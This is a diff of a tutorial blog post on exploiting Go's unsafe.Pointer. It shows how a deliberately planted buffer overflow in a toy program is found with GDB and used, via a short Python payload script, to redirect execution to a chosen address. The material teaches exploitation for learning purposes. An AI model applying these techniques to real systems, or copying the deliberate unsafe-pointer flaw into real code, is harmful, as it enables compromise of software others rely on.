@@ -1,4 +1,4 @@
-# Exploitation Exercise with Go unsafe.Pointer: Code Flow Redirection (Part 2)
+# Exploitation Exercise with Go unsafe.Pointer: Code Flow Redirection
 
 In this second part, we will evolve from reading memory to redirecting the code flow. This means we will be controlling
 what is being executed. 
@@ -21,6 +21,8 @@ effectively freeing them. This means the stack pointer `$rsp` will then point to
 Now comes the `ret` machine instruction. It is actually equivalent to `pop $rip` or even `mov $rip, [$rsp]; add $rsp, 8`.
 The processor will fetch the address stored on the top of the stack, put it into the instruction pointer register, and
 continue execution at that address.
+
+TODO: add a picture here
 
 If we can somehow change the return address stored on the stack to an address we can control, we can change the program
 control flow. 
@@ -68,7 +70,7 @@ func main() {
 There is a buffer of length 8 bytes with some harmless data. It is created as a local variable, which means it will live
 on the stack at an address a bit lower than the return address.
 
-Next, we will simulate an almost as bad coding practice as calling the `gets()` function in a C code. We will
+Next, we will simulate an almost-as-bad coding practice as calling the `gets()` function in a C code. We will
 deliberately create a buffer overflow vulnerability. Recall that Go has some safety features that prevent buffer
 overflows, so for this to work we are using the `unsafe.Pointer` type.
 
@@ -84,9 +86,9 @@ type SliceHeader struct {
 }
 ```
 
-The length and capacity are 512 in this case, and Data is a pointer to the underlying array that contains the elements
+The length and capacity are 512 in this case, and `Data` is a pointer to the underlying array that contains the elements
 in the slice. Now, using the magic of unsafe pointers we can obtain the address of the 8 byte harmless buffer, cast it
-into a `uintptr` address value and replace the Data pointer with that address. This way, the slice will now point to the
+into a `uintptr` address value and replace the `Data` pointer with that address. This way, the slice will now point to the
 small buffer as its underlying array, but the length will still be set to 512 bytes. 
 
 This is a misuse of the `unsafe` package and it creates a very dangerous situation: Calling `reader.Read()` in the next
@@ -98,9 +100,7 @@ but the effect is the same as the confused slice is more than long enough to pro
 ## Crafting a binary exploit
 
 Now, how can we use this buffer overflow vulnerability and create an actual exploit that will put a meaningful address 
-into the stack at exactly the right position to be loaded into the instruction pointer? For this, we will GDB. To make 
-debugging a bit easier, install the Python Exploit Development Assistance (PEDA) into GDB. Follow the instructions on 
-the [PEDA project page](https://github.com/longld/peda).
+into the stack at exactly the right position to be loaded into the instruction pointer? For this, we will use GDB.
 
 Playing around with the program shows an input prompt that reads some data and then seems to just swallow it:
 
@@ -158,7 +158,7 @@ stack: frame={sp:0xc000110f80, fp:0xc000110f88} stack=[0xc000110000,0xc000111000
 000000c000110fe0:  4141414141414141  4141414141414141 
 000000c000110ff0:  4141414141414141  4141414141414141 
 main.main()
-	/home/johannes/studium/s14/masterarbeit/code/exploits/code-injection/main.go:28 +0xb1 fp=0xc000110f88 sp=0xc000110f80 pc=0x4925d1
+	/tmp/code-injection/main.go:28 +0xb1 fp=0xc000110f88 sp=0xc000110f80 pc=0x4925d1
 ```
 
 In the resulting stack trace, we can even see a lot of `0x41` values, which is the ASCII value for the letter `A`.
@@ -200,9 +200,10 @@ gdb-peda$ x/8wx $rsp
 ```
 
 Using the `x` command, we inspect 8 words of data (each word is 4 bytes in GDB) and print them in hexadecimal form. The
-first two blocks (8 bytes) are the 64-bit processor word that the CPU wants to put into the `$rip` register. We can see
-that it is `0x4f4f4f4f50505050`. Looking at the ASCII table, we see that it corresponds to `OOOOPPPP`, and therefore
-we need to cut the padding just before the O's and replace those eight characters with the address we want to jump to.
+first two blocks (8 bytes total) are the 64-bit processor word that the CPU wants to put into the `$rip` register. We 
+can see that it is `0x4f4f4f4f50505050`. Looking at the ASCII table, we see that it corresponds to `OOOOPPPP`, and 
+therefore we need to cut the padding just before the O's and replace those eight characters with the address we want to 
+jump to.
 
 Just before closing GDB, let's quickly use it to find the address of our specially crafted `win` function. First, try
 to directly access its address:
@@ -212,10 +213,10 @@ gdb-peda$ x main.win
 No symbol "main.win" in current context.
 ``` 
 
-We see that there doesn't seem to be any function called win. This is because the Go compiler decided to inline the
+We see that there doesn't seem to be any function called `win`. This is because the Go compiler decided to inline the
 function (we can see the inlining decisions by compiling with `go build -gcflags='-m'`). Let's instead just directly
 jump to the address of the print call that will show us the win message. We search for it in the disassembly of the
-main function:
+`main` function:
 
 ```gdb
 gdb-peda$ disassemble main.main
@@ -273,10 +274,10 @@ Dump of assembler code for function main.main:
 End of assembler dump.
 ```
 
-It might not be completely obvious where the function starts, but given the call to win that we added to stop the
-compiler from removing the function altogether was inside an if-statement, it is reasonable that the function would
+It might not be completely obvious where the function starts, but given the call to `win` that we added to stop the
+compiler from removing the function altogether was inside an `if`-statement, it is reasonable that the function would
 be at the target of some conditional jump instruction (`je` in line <+161> here): it is at line <+178>, starting with
-a NOP instruction. Skipping the NOP, we can use line <+179> or address `0x00000000004925d3` as target.
+a `NOP` instruction. Skipping the `NOP`, we can use line <+179> or address `0x00000000004925d3` as target.
 
 So let's update the exploit code to use the correct padding and the target address:
 
@@ -291,7 +292,7 @@ win_p = struct.pack("Q", 0x4925d3)
 print(padding + win_p)
 ```
 
-Running the program creates with this input the following output:
+Running the program with this input creates the following output:
 
 ```shell script
 $ ./exploit_win.py | ./main
@@ -333,4 +334,11 @@ right at the top, which means that the `win` function was indeed executed. We do
 crash, the objective was to decide which code should be executed and this was successful!
 
 
-Continue reading with [Part 3: ROP and spawning a shell](unsafe-vulnerabilities-3-rop-and-spawning-a-shell.md)
+## Complete POC code
+
+You can read the full POC code in the Github repository that I created for this post series:
+
+{% github jlauinger/go-unsafepointer-poc no-readme %}
+
+
+Next week we are going to continue with part 3: Spawning a shell using Return Oriented Programming (ROP)
